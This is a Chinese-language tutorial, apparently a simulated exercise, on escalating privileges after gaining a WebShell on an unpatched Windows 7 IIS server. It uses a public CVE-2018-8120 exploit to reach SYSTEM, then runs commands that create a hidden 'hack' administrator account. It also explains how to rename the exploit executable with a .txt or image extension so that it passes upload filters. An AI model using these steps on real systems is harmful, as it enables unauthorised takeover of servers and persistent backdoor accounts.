## **前言**

这边是模拟拿到了一个WebShell的后渗透提权操作

## **提权过程**

首先是看了看一个当前用户权限

![](../Images/f0698bbdca5eb9986a440bf850ef6e9f.png)

iis apppool\\bjgs\_v2.1

是一个IIS的普通权限

![](../Images/16eaa6b460af5137bef7ae54726b83b2.png)

创建用户：拒绝访问，那么权限还是比较低的！

先是上传个大马看看有没有可读可写的目录:

![](../Images/36afe96e2eb65d821eb82ba6ac6b8b4e.png)

得到一个目录/文件夹：C:\\inetpub\\wwwroot\\bjgs\_v2.1 可读,可写。

先看看当前主机的信息：systeminfo

![](../Images/697352ac499c55d571bbc20bc645cf59.png)

关键信息有：          操作系统是Windows 7 x64        补丁只打了两个：KB2534111、KB976902

那么我们就可以上传\*.exe本地溢出提权！

这边是在Github上找到了一个提权exe : https://github.com/alpha1ab/CVE-2018-8120

CVE-2018-8120 Windows LPE exploit测试支持: Win7 x32, Win7 x64, Win2008 x32, Win2008 R2 x32, Win2008 R2 Datacenter x64, Win2008 Enterprise x64 WinXP x32, Win2003 x32,Win2003 x64原exp不支持xp，2003，当前代码在原基础上增加了对这两个系统的支持

把exe上传到可读可写的目录:

![](../Images/368f28311ec872ee8ad7f8b31587c5c7.png)

先是使用exe看了看当前权限：

![](../Images/0a36258646e7edfc07cf7c10bdca4a7d.png)

是一个：nt authority\\system系统权限！

提权命令：（创建一个hack用户并且提升为管理员组）

CVE-2018-8120.exe "net user hack hack /add"CVE-2018-8120.exe "net localgroup administrators hack /add"

![](../Images/5f8fad68205d16f3a506fb6f4bd6529f.png)

提权成功！

## **番外篇**

### **二进制文件后缀可任意修改**

首先我们是有一个二进制文件：CVE-2018-8120.exe

![](../Images/72023d1011676689fd10ccb45720d50a.png)

接着把exe后缀改成txt

![](../Images/08abde7c09c1b98d17bdca68ba6ab76b.png)

CVE-2018-8120.txt “whoami”

![](../Images/c17981b89f5b79cb5c0cdb49674722eb.png)

可以看到，是可以执行的！一般这种用于不能上传exe、bat文件，我们就可以把exe文件修改为可上传的后缀文件也能照常运行！

![](../Images/5e3d5f34ac02e5421c4cab5cb0a204de.png)

图片格式也是可以的！
